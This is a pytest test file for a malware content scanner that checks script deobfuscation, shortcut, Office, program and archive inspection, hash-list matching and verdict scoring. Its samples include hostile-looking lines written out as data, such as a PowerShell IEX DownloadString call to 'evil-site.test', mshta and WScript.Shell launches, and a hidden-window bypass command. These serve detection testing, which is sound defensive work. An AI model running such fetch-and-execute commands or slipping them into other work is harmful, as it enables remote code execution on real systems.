"""Deep content analysis (ADR-020): what is INSIDE a file. The scanners read inert, test-built files
(tests/deephelp.py); nothing here can run, and no real malware is used. Covers the guest scanners
(scripts, hidden layers, shortcuts, Office files, programs), archives, the hash lists, the engines
and the way a known-bad hash decides on its own."""

import asyncio
import base64
import hashlib
import json
import random
import time
import zlib
from pathlib import Path
from typing import Any

import contentscan
import deephelp as d
import filescan
import httpx
import olescan
import pytest
from mailhelp import analyze, eml, in_process_file

from core import hashlists
from core.contracts import VerdictState
from core.email.models import FileReply
from core.files.engine import analyze_file
from core.intel import __main__ as intel_cli
from core.intel import hashfeed
from core.intel.http import make_client
from core.risk.scoring import score
from rules.email.data import scoring


@pytest.fixture(autouse=True)
def no_lists() -> Any:
    hashlists.configure(None)
    yield
    hashlists.configure(None)


def scan(data: bytes, magic: str | None = None) -> dict[str, Any]:
    found = contentscan.scan_content(data, magic)
    FileReply.model_validate({"ok": True, "file": found})  # what the host will accept
    return found


def ind(found: dict[str, Any]) -> set[str]:
    return set(found["indicators"])


# ---- scripts and what they do ------------------------------------------------------------------


@pytest.mark.parametrize(
    ("sample", "family", "expected"),
    [
        (d.VBS_DROPPER, "vbscript", {"download", "exec_shell"}),
        (d.PS_ENCODED, "powershell", {"encoded_command", "download", "execute_dynamic"}),
        (d.JS_EVAL, "jscript", {"base64_decode", "execute_dynamic", "exec_shell"}),
        (
            "<html><body><script>var s = new ActiveXObject('WScript.Shell');"
            "s.Run('cmd /c calc');</script></body></html>",
            "html",
            {"exec_shell"},
        ),
    ],
)
def test_a_script_is_recognised_by_its_content_and_what_it_does(
    sample: str, family: str, expected: set[str]
) -> None:
    found = scan(sample.encode(), "html" if family == "html" else None)
    assert found["family"] == family and expected <= ind(found)


@pytest.mark.parametrize(
    "sample",
    [d.VBS_BENIGN, d.PS_BENIGN, d.BAT_BENIGN, "Hello Bob,\nI will download the slides later.\n"],
)
def test_ordinary_scripts_and_text_stay_quiet(sample: str) -> None:
    found = scan(sample.encode())
    assert found["indicators"] == {} and found["layers"] == 0 and found["embedded"] == {}


def test_a_note_that_merely_mentions_a_download_is_not_called_a_script() -> None:
    found = scan(b"To get the file, use Invoke-WebRequest or just download it by hand.")
    assert found["family"] == "text" and found["indicators"] == {}


def test_a_one_line_encoded_command_in_plain_text_is_still_found() -> None:
    found = scan(d.PS_ENCODED.encode())
    assert found["family"] == "powershell" and found["layers"] == 1
    assert found["urls"] == ["http://evil-site.test/a.ps1"]  # the address inside the hidden layer


# ---- undoing disguises -------------------------------------------------------------------------


def test_characters_spelled_with_codes_are_turned_back_into_words() -> None:
    vbs = f"Set s = CreateObject({d.chr_codes('WScript.Shell')})\r\ns.Run x\r\nDim a\r\n"
    assert "WScript" not in vbs and "exec_shell" in ind(scan(vbs.encode()))
    codes = "87,83,99,114,105,112,116,46,83,104,101,108,108"
    js = f"var x = String.fromCharCode({codes});\nfunction f(){{}}"
    assert "WScript.Shell" not in js and "exec_shell" in ind(scan(js.encode()))
    ps = "$x = [char]87+[char]83+'cript.Shell'; $y = 1\r\nWrite-Host $x"
    found = scan(ps.encode())
    assert found["family"] == "powershell" and "exec_shell" in ind(found)


def test_pieces_escapes_backticks_and_carets_are_joined() -> None:
    assert "exec_shell" in ind(scan(b'Dim a\r\nSet s = CreateObject("WSc" & "ript.Sh" & "ell")'))
    assert "download" in ind(scan(rb"var u = '\x44ownloadString'; function f(){} var z = 1"))
    assert "execute_dynamic" in ind(scan(b"$a = 1\r\nWrite-Host x\r\ni`e`x $a"))
    assert "lolbin_proxy" in ind(scan(b"@echo off\r\nsetlocal\r\nm^s^h^t^a http://x.test/a.hta"))


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def test_encoded_layers_are_unwrapped_up_to_a_limit() -> None:
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil-site.test/a')"
    once = f"$a = '{b64(inner)}'\r\n[Convert]::FromBase64String($a)\r\nWrite-Host 1"
    twice = f"$a = '{b64(once)}'\r\n[Convert]::FromBase64String($a)\r\nWrite-Host 1"
    assert scan(once.encode())["layers"] == 1 and "download" in ind(scan(twice.encode()))
    assert scan(twice.encode())["layers"] == 2
    deep = inner
    for _ in range(contentscan.MAX_LAYERS + 3):
        deep = f"$a = '{b64(deep)}'\r\nWrite-Host 1\r\n$b = 2"
    found = scan(deep.encode())
    assert found["truncated"] is True and found["layers"] <= contentscan.MAX_LAYERS


def test_deflated_and_hex_encoded_payloads_are_found_and_programs_are_reported() -> None:
    payload = b"IEX (New-Object Net.WebClient).DownloadString('http://evil-site.test/a')"
    deflater = zlib.compressobj(wbits=-15)
    packed = base64.b64encode(deflater.compress(payload) + deflater.flush()).decode()
    assert "download" in ind(scan(f"$a = '{packed}'\r\nWrite-Host 1\r\n$b = 2".encode()))
    hexed = payload.hex()
    assert "download" in ind(scan(f"$a = '{hexed}'\r\nWrite-Host 1\r\n$b = 2".encode()))
    exe = base64.b64encode(d.pe()).decode()
    found = scan(f"$a = '{exe}'\r\nWrite-Host 1\r\n$b = 2".encode())
    assert found["embedded"] == {"exe": 1}


def test_a_program_hidden_in_a_script_without_encoding_is_reported() -> None:
    found = scan(b"Dim a\r\nMsgBox a\r\n" + d.pe())
    assert found["embedded"].get("exe") == 1


def test_the_standard_antivirus_test_file_is_recognised() -> None:
    assert scan(d.EICAR)["eicar"] is True and scan(b"x" + d.EICAR)["eicar"] is False


# ---- shortcuts, Office files, programs ---------------------------------------------------------


def test_a_shortcut_that_runs_an_interpreter_with_a_hidden_command_is_read() -> None:
    args = "-w hidden -enc " + d.PS_ENCODED.split("-enc ")[1]
    found = scan(d.lnk(args=args, icon=r"C:\Windows\System32\imageres.dll"), "lnk")
    assert found["family"] == "lnk" and found["layers"] == 1
    assert {"lnk_interpreter", "lnk_icon_lure", "hidden_window", "download"} <= ind(found)
    assert "lnk_hidden_args" in ind(scan(d.lnk(args="/c calc" + " " * 400 + "x"), "lnk"))
    assert scan(d.lnk(target=r"C:\Windows\notepad.exe"), "lnk")["indicators"] == {}


def test_an_office_file_macro_is_extracted_and_searched() -> None:
    found = scan(d.ole_with_macro(d.MACRO_AUTOEXEC_SHELL), "ole")
    assert {"macro_code", "autoexec", "exec_shell"} <= ind(found)
    assert ind(scan(d.ole_with_macro(d.MACRO_QUIET), "ole")) == {"macro_code"}
    assert ind(scan(d.cfb({"WordDocument": b"x" * 5000}), "ole")) == set()  # no macro, no claim
    assert "ole_object" in ind(scan(d.cfb({"\x01Ole10Native": b"x" * 100}), "ole"))
    assert "equation_editor" in ind(scan(d.cfb({"Equation Native": b"x" * 100}), "ole"))


def test_the_macro_decompression_round_trips_and_refuses_damage() -> None:
    source = (d.MACRO_AUTOEXEC_SHELL * 60).encode()
    packed = d.ovba_compress(source)
    assert len(packed) < len(source) // 3 and olescan.ovba_decompress(packed) == source
    assert olescan.ovba_decompress(b"") == b"" and olescan.ovba_decompress(b"\x02abc") == b""
    broken = bytearray(packed)
    broken[8] ^= 0xFF
    olescan.ovba_decompress(bytes(broken))  # damaged data ends early, never raises


def test_a_program_is_judged_by_structure_not_by_name() -> None:
    packed = scan(
        d.pe(
            packed=True, rwx=True, strings=b"VirtualAllocEx WriteProcessMemory CreateRemoteThread"
        ),
        "exe",
    )
    assert {"pe_packed", "pe_rwx", "pe_injection_apis"} <= ind(packed)
    fetcher = scan(d.pe(strings=b"URLDownloadToFileA ShellExecuteA http://payload.test/x"), "exe")
    assert "pe_downloader_apis" in ind(fetcher) and fetcher["urls"] == ["http://payload.test/x"]
    assert scan(d.pe(), "exe")["indicators"] == {}


def test_rtf_objects_and_remote_templates_are_found() -> None:
    found = scan(d.rtf_with_object(equation=True, template="http://x.test/t.dotm"), "rtf")
    assert {"ole_object", "equation_editor", "remote_template"} <= ind(found)
    assert found["urls"] == ["http://x.test/t.dotm"]


# ---- hostile input: never raises, stays inside its limits --------------------------------------


@pytest.mark.parametrize("seed", range(8))
def test_random_and_truncated_files_never_raise_whatever_they_claim_to_be(seed: int) -> None:
    rng = random.Random(seed)
    for good in (d.lnk(args="x"), d.ole_with_macro(d.MACRO_QUIET), d.pe(), d.rtf_with_object()):
        for _ in range(12):
            data = bytearray(good)
            for _ in range(rng.randint(1, 20)):
                data[rng.randrange(len(data))] = rng.randrange(256)
            cut = bytes(data[: rng.randrange(1, len(data) + 1)])
            for magic in ("lnk", "ole", "exe", "rtf", None):
                found = contentscan.scan_content(cut, magic)
                assert found["kind"] in ("content", "none")
    for size in (0, 1, 7, 600):
        for magic in ("lnk", "ole", "exe", "rtf", "html", None):
            contentscan.scan_content(rng.randbytes(size), magic)


def test_huge_and_pathological_text_stays_within_time_and_size() -> None:
    cases = [
        b"A" * 3_000_000,
        b" " * 2_000_000 + b"powershell",
        ("Chr(65)" + "&" * 5 + "\r\n").encode() * 20_000,
        b"'a'+" * 300_000 + b"'b'",
        b"\\x41" * 500_000,
        b"`" * 2_000_000,
        (b"QUJD" * 500 + b"\n") * 300,
        b"a=" + b"\\" * 1_000_000,
    ]
    for data in cases:
        start = time.perf_counter()
        found = scan(b"Dim a\r\nMsgBox a\r\n" + data)
        assert time.perf_counter() - start < 8, data[:20]
        assert found["kind"] == "content"


# ---- archives: hash every entry and look inside ------------------------------------------------


def test_archive_entries_are_hashed_and_code_inside_is_reported() -> None:
    import archives
    import filehelp as fh

    zipped = fh.make_zip(
        {
            "readme.txt": b"hello",
            "invoice.vbs": d.VBS_DROPPER.encode(),
            "x.lnk": d.lnk(args="/c calc"),
        }
    )
    found = archives.scan_archive(zipped)
    FileReply.model_validate({"ok": True, "file": found})
    members = {m["sha256"]: m for m in found["members"]}
    assert hashlib.sha256(d.VBS_DROPPER.encode()).hexdigest() in members
    families = sorted(m["content"]["family"] for m in found["members"] if m["content"])
    assert families == ["lnk", "text", "vbscript"]


def test_an_office_package_reports_its_macro_remote_template_and_dde() -> None:
    import archives

    package = d.ooxml(
        {
            "word/vbaProject.bin": b"x",
            "word/_rels/document.xml.rels": d.rels(
                ("attachedTemplate", "http://evil-site.test/t.dotm", True),
                ("hyperlink", "http://fine.test/", True),
            ),
        }
    )
    found = archives.scan_archive(package)
    assert found["office"] == "word" and found["vba_project"] and found["remote_template"]
    assert found["external_refs"] == ["http://evil-site.test/t.dotm"]  # a hyperlink is normal
    dde = archives.scan_archive(
        d.ooxml({"word/document.xml": b"<w:instrText> DDEAUTO c:\\x </w:instrText>"})
    )
    assert dde["dde"] is True
    plain = archives.scan_archive(d.ooxml())
    assert plain["office"] == "word" and not (
        plain["vba_project"] or plain["remote_template"] or plain["dde"]
    )


def test_archive_member_scanning_respects_its_caps() -> None:
    import archives
    import filehelp as fh

    many = fh.make_zip({f"f{i}.txt": f"file {i}".encode() for i in range(120)})
    found = archives.scan_archive(many)
    assert len(found["members"]) == 64 and "members" in found["limits"]
    big = fh.make_zip({"big.vbs": b"Dim a\r\n" + b"x" * 700_000})
    assert (
        archives.scan_archive(big)["members"] == []
    )  # over the per-member size: not read, not hashed


# ---- hash lists --------------------------------------------------------------------------------


def test_hashes_are_taken_from_any_text_and_only_hashes_are_kept(tmp_path: Path) -> None:
    sha = "a" * 64
    md5 = "B" * 32
    sample = tmp_path / "feed.csv"
    rows = [
        f"# comment {'c' * 64}",
        f'"2026-01-01","{sha}","{md5}","name; DROP TABLE"',
        f"not-a-hash {'d' * 31}",
    ]
    sample.write_text("\n".join(rows) + "\n", encoding="utf-8")
    kept = hashlists.import_list(sample, "my-iocs", tmp_path / "lists")
    assert kept == 2
    text = (tmp_path / "lists" / "my-iocs.txt").read_text(encoding="utf-8")
    assert sha in text and md5.lower() in text and "DROP" not in text and "c" * 64 not in text
    with pytest.raises(ValueError, match="list name"):
        hashlists.import_list(sample, "../escape", tmp_path / "lists")


def test_a_lookup_names_the_list_and_the_built_in_test_file_is_always_known(tmp_path: Path) -> None:
    store = hashlists.HashStore(tmp_path)
    assert store.lookup(hashlists.digests(d.EICAR)) == [
        ("sha256", "eicar-test-file"),
        ("sha1", "eicar-test-file"),
        ("md5", "eicar-test-file"),
    ]
    (tmp_path / "team.txt").write_text("e" * 64 + "\n", encoding="utf-8")
    assert store.lookup({"sha256": "e" * 64}) == [("sha256", "team")]  # reloaded on change
    assert store.lookup({"sha256": "f" * 64, "md5": "0" * 32}) == []
    (tmp_path / "team.txt").write_text("", encoding="utf-8")
    assert store.lookup({"sha256": "e" * 64}) == []
    assert {i.name for i in store.status()} == {"eicar-test-file", "team"}


# ---- the engines: a known-bad hash decides on its own ------------------------------------------


def judge(data: bytes, name: str = "payload.dat") -> Any:
    return analyze_file(
        name, len(data), hashlib.sha256(data).hexdigest(), data, run=in_process_file
    )


def test_the_test_file_is_malicious_with_the_hash_and_the_content_as_evidence() -> None:
    r = judge(d.EICAR).report
    rules = {s.rule_id for s in r.verdict.signals}
    assert r.verdict.state is VerdictState.MALICIOUS and r.verdict.risk_score >= 95
    assert {"intel.hash_known_bad", "content.eicar"} <= rules
    assert r.hashes["sha256"] == hashlib.sha256(d.EICAR).hexdigest() and len(r.hashes) == 3
    assert {m.source for m in r.hash_matches} == {"eicar-test-file"} and r.hash_lists >= 1


def test_a_listed_hash_is_malicious_even_when_the_file_cannot_be_opened(tmp_path: Path) -> None:
    data = b"just some bytes that no scanner would flag"
    digest = hashlib.sha256(data).hexdigest()
    (tmp_path / "ioc.txt").write_text(digest + "\n", encoding="utf-8")
    hashlists.configure(tmp_path)

    def broken(_: bytes) -> Any:
        from core import sandbox

        raise sandbox.SandboxUnavailable

    got = analyze_file("x.bin", len(data), digest, data, run=broken).report
    assert got.verdict.state is VerdictState.MALICIOUS
    assert [s.rule_id for s in got.verdict.signals] == ["intel.hash_known_bad"]
    other = b"different bytes"
    unknown = analyze_file(
        "y.bin", len(other), hashlib.sha256(other).hexdigest(), other, run=broken
    )
    assert unknown.report.verdict.state is VerdictState.ERROR  # an unopened file is never a pass
    assert not got.verdict.signals[0].description.count(digest)  # the list is named, not echoed


def test_a_file_too_large_to_open_is_still_matched_by_its_hash(tmp_path: Path) -> None:
    from core.files import engine

    data = b"z" * (engine.MAX_FILE_BYTES + 1)
    digest = hashlib.sha256(data).hexdigest()
    (tmp_path / "ioc.txt").write_text(digest + "\n", encoding="utf-8")
    hashlists.configure(tmp_path)
    got = analyze_file("big.bin", len(data), digest, data, run=in_process_file)
    assert got.report.verdict.state is VerdictState.MALICIOUS
    plain = analyze_file("big.bin", len(data), digest, None, run=in_process_file)
    assert plain.report.verdict.state is VerdictState.MALICIOUS  # by the agent's hash alone


def test_a_known_bad_file_inside_an_archive_is_found_by_the_hash_of_the_entry() -> None:
    import filehelp as fh

    archive = fh.make_zip({"notes.txt": b"hi", "tool.dat": d.EICAR})
    r = judge(archive, "docs.zip").report
    assert r.verdict.state is VerdictState.MALICIOUS
    assert any(m.where == "archive entry" for m in r.hash_matches)


def test_a_dropper_script_is_judged_from_its_code_not_its_name() -> None:
    quiet = judge(d.VBS_BENIGN.encode()).report.verdict
    assert quiet.state is VerdictState.UNKNOWN and quiet.signals == []
    r = judge(d.VBS_DROPPER.encode()).report
    assert "content.script_downloader" in {s.rule_id for s in r.verdict.signals}
    assert r.verdict.state in (VerdictState.SUSPICIOUS, VerdictState.MALICIOUS)
    assert any(
        "payload-host.test" in (link.host or "") for link in r.links
    )  # the URL engine saw it
    assert r.files[0].kind == "content" and "download" in r.files[0].facts


def test_a_script_named_like_a_document_is_flagged_for_the_disguise() -> None:
    r = judge(d.VBS_DROPPER.encode(), "invoice.pdf").report
    assert "content.disguised_program" in {s.rule_id for s in r.verdict.signals}


def test_stacked_evidence_from_independent_categories_makes_a_script_malicious() -> None:
    nasty = d.PS_ENCODED + "\r\n" + "powershell -w hidden -ep bypass -nop IEX x"
    r = judge(nasty.encode()).report
    ids = {s.rule_id for s in r.verdict.signals}
    assert {"content.script_encoded", "content.script_downloader"} <= ids
    assert r.verdict.state is VerdictState.MALICIOUS and r.verdict.recommended_response.value in (
        "QUARANTINE",
        "BLOCK",
    )


# ---- messages: attachments are searched too, whatever they are called --------------------------


def test_a_script_attachment_with_no_known_type_is_searched() -> None:
    mail = eml(attachments=[("order.dat", d.VBS_DROPPER.encode(), "application/octet-stream")])
    v = analyze(mail).report.verdict
    assert "content.script_downloader" in {s.rule_id for s in v.signals}


def test_the_test_file_attached_to_a_message_is_malicious_by_its_hash() -> None:
    mail = eml(attachments=[("scan.dat", d.EICAR, "application/octet-stream")])
    v = analyze(mail).report.verdict
    assert v.state is VerdictState.MALICIOUS
    assert {"intel.hash_known_bad", "content.eicar"} <= {s.rule_id for s in v.signals}


# ---- scoring and the closed vocabulary ---------------------------------------------------------


def test_only_the_named_rules_are_certain() -> None:
    from core.contracts import Signal

    cfg = scoring()
    assert set(cfg["certain"]["rules"]) == {"intel.hash_known_bad", "content.eicar"}
    weak = Signal(
        rule_id="content.script_encoded",
        category="obfuscation",
        weight=0.7,
        description="x",
        evidence_ids=[],
        attack=None,
    )
    assert score([weak], False, cfg).state is not VerdictState.MALICIOUS
    sure = Signal(
        rule_id="intel.hash_known_bad",
        category="known_bad",
        weight=0.99,
        description="x",
        evidence_ids=[],
        attack=None,
    )
    scored = score([sure], False, cfg)
    assert (
        scored.state is VerdictState.MALICIOUS
        and scored.risk_score is not None
        and scored.risk_score >= 95
    )


def test_the_host_refuses_an_indicator_the_sandbox_made_up() -> None:
    reply = {"ok": True, "file": contentscan.scan_content(d.VBS_DROPPER.encode(), None)}
    FileReply.model_validate(reply)
    reply["file"]["indicators"]["invented"] = 1
    with pytest.raises(ValueError, match="invented|indicators"):
        FileReply.model_validate(reply)


def test_dispatch_routes_by_content_and_leaves_pictures_and_pdfs_alone() -> None:
    import filehelp as fh

    assert filescan.inspect_data(d.ole_with_macro(d.MACRO_QUIET))["family"] == "ole"
    assert filescan.inspect_data(fh.PDF_PLAIN)["kind"] == "pdf"
    assert filescan.inspect_data(fh.blank_png())["kind"] == "image"
    assert filescan.inspect_data(b"")["kind"] == "none"


# ---- the command line and the opt-in download --------------------------------------------------


def run_cli(monkeypatch: pytest.MonkeyPatch, tmp_path: Path, *args: str) -> int:
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("LYNCEUS_DATA_DIR", str(tmp_path / "data"))
    return intel_cli.main(["hashes", *args])


def test_check_hashes_a_file_here_and_says_what_matched(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # a stand-in file: the real EICAR string is never written to disk (the antivirus would react)
    target = tmp_path / "sample.bin"
    target.write_bytes(b"a harmless stand-in for a known-bad file")
    digest = hashlib.sha256(target.read_bytes()).hexdigest()
    (tmp_path / "data" / "hashes").mkdir(parents=True)
    (tmp_path / "data" / "hashes" / "ioc.txt").write_text(digest + "\n", encoding="utf-8")
    assert run_cli(monkeypatch, tmp_path, "check", str(target)) == 1
    out = capsys.readouterr().out
    assert digest in out and "KNOWN BAD" in out and "'ioc'" in out
    target.write_bytes(b"harmless")
    assert run_cli(monkeypatch, tmp_path, "check", str(target)) == 0
    assert "not a sign of safety" in capsys.readouterr().out


def test_import_then_status_lists_what_was_loaded(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    source = tmp_path / "iocs.txt"
    source.write_text("\n".join(["1" * 64, "2" * 40]), encoding="utf-8")
    assert run_cli(monkeypatch, tmp_path, "import", str(source), "--name", "team") == 0
    assert run_cli(monkeypatch, tmp_path, "status") == 0
    out = capsys.readouterr().out
    assert (
        "team" in out
        and "eicar-test-file" in out
        and run_cli(monkeypatch, tmp_path, "import", str(tmp_path / "nope"), "--name", "x") == 2
    )


KEY = "abuse-key-0123456789"  # pragma: allowlist secret


def download(
    directory: Path, handler: Any, key: str | None = KEY, **options: Any
) -> tuple[str, int, str]:
    client = make_client(httpx.MockTransport(handler), 5.0)
    return asyncio.run(hashfeed.sync(directory, client, key, **options))


def test_the_download_merges_each_run_and_never_leaks_the_key(tmp_path: Path) -> None:
    seen: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(str(request.url))
        return httpx.Response(200, text=f'# hashes\n"2026","{"a" * 64}","{"b" * 32}"\n')

    status, count, detail = download(tmp_path, handler, now=1000.0)
    assert (status, count) == ("updated", 2)
    assert seen == [f"https://mb-api.abuse.ch/v2/files/exports/{KEY}/recent.csv"]
    assert KEY not in detail
    status, _, _ = download(tmp_path, handler, now=time.time())
    assert status == "fresh" and len(seen) == 1  # under five minutes: no second download

    def next_batch(_: httpx.Request) -> httpx.Response:
        return httpx.Response(200, text=f"{'c' * 64}\n")

    status, count, _ = download(tmp_path, next_batch, force=True)
    assert (status, count) == ("updated", 3)  # the new hash is added to what was already known


@pytest.mark.parametrize(
    ("status_code", "body", "reason"),
    [
        (401, "", "credentials rejected"),
        (429, "", "rate limited"),
        (302, "", "redirect not followed"),
        (500, "", "http 500"),
        (200, "no hashes here", "no hashes"),
    ],
)
def test_a_failed_download_is_a_stated_error_and_keeps_the_old_list(
    tmp_path: Path, status_code: int, body: str, reason: str
) -> None:
    hashlists.write_list(tmp_path, hashfeed.NAME, ["9" * 64])

    def handler(_: httpx.Request) -> httpx.Response:
        return httpx.Response(status_code, text=body)

    status, count, detail = download(tmp_path, handler, force=True)
    assert status == "error" and reason in detail and count == 1
    assert hashlists.read_list(tmp_path, hashfeed.NAME) == {"9" * 64}
    assert download(tmp_path, handler, None)[0] == "error"  # no key: nothing is asked


def test_the_json_the_api_returns_for_a_file_carries_hashes_and_matches() -> None:
    body = json.loads(judge(d.EICAR).report.model_dump_json())
    assert set(body["hashes"]) == {"sha256", "sha1", "md5"}
    assert body["hash_matches"][0]["source"] == "eicar-test-file"
